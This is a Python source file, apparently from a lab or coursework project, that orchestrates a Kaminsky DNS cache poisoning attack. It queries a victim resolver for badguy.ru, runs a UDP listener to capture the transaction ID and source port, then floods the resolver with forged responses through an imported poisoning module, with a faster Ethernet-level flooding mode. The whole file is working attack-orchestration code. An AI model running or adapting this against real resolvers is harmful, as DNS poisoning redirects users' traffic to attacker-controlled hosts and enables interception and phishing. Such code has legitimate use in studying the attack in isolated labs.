#! /usr/bin/env python3
   
## @package DNS_Attack
#   This package is responsible to execute all the passage required for the attack
#
import dns.resolver
from dns.resolver import NoAnswer
import socket
import signal
from multiprocessing.pool import ThreadPool, Pool

from enum import Enum


from dns_poisoning import DNSPoisoning
##  @class DNSAttack
#
#   @brief Brief description
#
#   This class provide an interface to perform the Kaminsky DNS poisoning attack.\n
#   Apart from providing an interface to the DNSPoisoning module, it has function that allows to fetch the TXID and the port used by the target server.
#
class DNSAttack:

    ##
    #   Used to specified the attack mode
    class Mode(Enum):
        ## Uses IP layer packets
        NORMAL = 1
        ## Uses Ethernet layer frames
        FAST = 2
    

    ## Constructors
    #
    #   @param victim_server_ip
    #   @param attacked_domain 
    #   @param bad_udp_ip   The UDP server IP
    #   @param bad_udp_port The UDP server port
    #   @param attacker_ip
    #   @param victim_mac   The victim server MAC address (Only required for faster flooding)
    #   @param ns_server_ip The authoritative NS server for the target domain
    #
    #   @param blessing_terminal The istance of the blessing terminal (Default None)
    #   @param sigint_handler    The functin to call when SIGINT signal is received
    #   @param log_function      The function to call when message need to be printed
    #
    #   @todo Implement automatic NS server fetching when no ns_server_ip is passed
    #   @todo Check if port and IP are valid

    def __init__(self, victim_server_ip, attacked_domain, bad_server_data,\
         attacker_ip, ns_server_ip=None, victim_mac=None, nic_interface=None,\
             blessing_terminal=None, sigint_handler=None, log_function=lambda msg: None):

        self.victim_server_ip = victim_server_ip
        self.attacker_ip = attacker_ip
        self.domain = attacked_domain
        self.bad_udp_ip = bad_server_data[0]
        self.bad_udp_port = bad_server_data[1]
        self.ns_server_ip = ns_server_ip

        #Only required for faster flooding
        self.victim_mac = victim_mac
        self.nic_interface = nic_interface

        #Enchant parameters
        self.t = blessing_terminal
        self.sigint_handler = sigint_handler
        self.log = log_function

        #Internal Variable
        self.stop_flag = False

    #Exceptions

    ##  
    #   @brief Raised when a critical error occurred
    #
    class CriticalError(Exception):
        pass

    ##  
    #   @brief Exception raised when the initial query fails
    #
    #   Raised when initial query performed to get a TXID fails    
    class InitialQueryFailed(CriticalError):
        pass

    ##  
    #   @brief Raised when the attack succeded
    #
    class SuccessfulAttack(Exception):
        pass


    def stop_attack(self, sig, frame):
        self.stop_flag = True
        #Attach SIGINT signal to the Main stop handler
        signal.signal(signal.SIGINT, self.sigint_handler)

    ##  Start UDP Server
    #   @brief Start an UDP server on specified port and return the fetched TXID
    #   @return (int) The fetched TXID
    #
    def get_server_data(self):

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
        sock.bind((self.bad_udp_ip, self.bad_udp_port))

        self.log("Listening for incoming DNS request...")

        while True:
            data, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
            self.log("Response source port :{t.bold}{t.blue}" + str(addr[1]) + "{t.normal}", 2)
            received_id = data[0:2]

            initial_id = int.from_bytes(received_id, byteorder='big')
            self.log("ID: " + str(initial_id), 3)

            sock.close()
            return (initial_id, addr[1])

    ##
    #   @brief Start the process to send the initial query
    #   
    def send_initial_query(self):

        victim_server = dns.resolver.Resolver()
        victim_server.nameservers = [self.victim_server_ip]

        try:
            answer = victim_server.query("badguy.ru", "A")
            for rdata in answer:
                    self.log("Query response received", 2)
        except:
            self.log("{t.red}{t.bold}Query failed{t.normal}")
            raise self.InitialQueryFailed

    ## 
    #   @brief Get IP of the NS server (Unimplemented)
    #   @param domain           The domain used to fetch NS server
    #   @param dns_server_ip    The server where request should be sent
    #   @bug Actually not working
    def get_authoritative_server(self, domain, dns_server_ip):

        dns_server = dns.resolver.Resolver()
        dns_server.nameservers = [dns_server_ip]

        response = dns_server.query(domain, 'NS')
        if response.rrset is not None:
            ns_server = str(response.rrset)
            print("NS server(s): " + ns_server)

            response = dns_server.query(ns_server, 'A')

    ##  Start
    #   @brief Start the attack
    #   @param number_of_tries (int) The number of tentative (Default 50)
    #   @param mode (DNSAttack.Mode) The type of attack to be performed, see the above link
    #   @see DNSAttack::Mode
    #
    def start(self, number_of_tries=50, mode=Mode.NORMAL):

        succeded = False
        num = number_of_tries

        self.log("Executing " + str(number_of_tries) + " attacks...")

        self.log("Opening socket...")
        flood_socket = DNSPoisoning.create_socket(self, 'vboxnet0')

        if mode == self.Mode.NORMAL:
            print("Using Normal Mode")
        elif mode == self.Mode.FAST:
            print("Using Faster Mode")

        print(self.victim_mac)

        while number_of_tries and not succeded and not self.stop_flag:

            self.log("\n ------ {t.bold}{t.shadow}Attack Number " + str(number_of_tries - num) + "{t.normal} ------\n")


            self.log("Starting DNS light server")

            pool = ThreadPool(processes=1)
            async_data_result = pool.apply_async(self.get_server_data)

            
            self.log("\n\nStart sending the first request to \"{t.italic}badguy.ru{t.normal}\"")
            try:
                self.send_initial_query() #Start the DNS listening server
            except self.InitialQueryFailed:
                self.log("\n{t.red}Unable to get inital TXID, terminating...{t.normal}")
                pool.terminate()    #Terminate the UDP server
                raise self.CriticalError

            fetched_id, source_port = async_data_result.get()  # get the return value from your function.

            self.log("Fetched ID: {t.green}{t.bold}" + str(fetched_id) + "{t.normal}")
            self.log("Source port: {t.blue}{t.bold}" + str(source_port) + "{t.normal}")


            poison= DNSPoisoning(self.victim_server_ip, self.domain, self.attacker_ip, '10.0.0.1', fetched_id, sport = source_port,\
                victim_mac=self.victim_mac, interrupt_handler=self.stop_attack, log=self.log, socket=flood_socket)


            self.log("Ok, let's try to perform \"{t.italic}Classical Shenanigans{t.normal}\" attack")

            poison.set_attack_type(DNSPoisoning.AttackType.NORMAL)



            #Attach SIGINT signal to the DNSPoisoning stop handler
            signal.signal(signal.SIGINT, poison.stop_handler)

            self.log("Now the victim server wait for response, we {t.underline}flood a mass of crafted request{t.normal}...")

            if mode == self.Mode.NORMAL:
                
                poison.start_flooding()

            elif mode == self.Mode.FAST:
                poison.set_interface('vboxnet0')
                poison.set_victim_mac(self.victim_mac)
                poison.faster_flooding()    #Using the faster version
        


            #time.sleep(1)

            #self.log("Checking the attack results")
            #if poison.check_poisoning():
            #    self.log("\n\n{t.green}Attack Succeded{t.normal}!!!!")
            #    succeded = True
            #    time.sleep(2)
            #    raise self.SuccessfulAttack
            #else:
            #    self.log("\n\n{t.red}{t.bold}Attack Failed{t.normal}!!!!")
            #    num = num - 1
        
        self.log("Attack {t.red}{t.bold}STOPPED{t.normal}")